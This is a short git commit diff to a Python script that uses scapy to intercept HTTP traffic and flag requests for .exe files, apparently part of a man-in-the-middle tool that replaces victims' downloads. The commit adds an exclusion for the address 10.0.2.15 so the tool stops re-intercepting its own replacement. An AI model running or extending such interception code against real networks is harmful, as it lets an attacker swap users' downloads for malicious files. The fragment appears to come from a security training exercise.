bf2aa7eebb133b94f3180665b2b8a065d0634bfb
Isabel <isabel.s.mai@gmail.com>
2019-02-02 12:01:30 +1100

    Fixed infinite loop bug

--- replace_downloads.py
+++ replace_downloads.py
@@ -22,7 +22,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
